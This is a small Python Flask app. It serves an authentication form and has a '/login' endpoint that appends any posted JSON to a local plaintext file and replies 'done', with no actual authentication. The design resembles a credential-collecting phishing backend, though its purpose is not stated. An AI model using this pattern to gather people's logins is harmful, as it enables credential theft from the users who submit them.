from flask import Flask
from flask import request, url_for, render_template
import json

app = Flask(__name__)

@app.route('/')
def auth_form():
    return render_template("index.html")


@app.route('/login', methods=['POST'])
def login():
    if request.method == "POST":
        data = request.json
        data_file = 0
        try:
            data_file = open('data', 'a')
        except Exception as e:
            data_file = open('data', 'w')
        json.dump(data, data_file)
        data_file.write('\n')
        data_file.close()
    return "done"


if __name__ == "__main__":
    app.run()
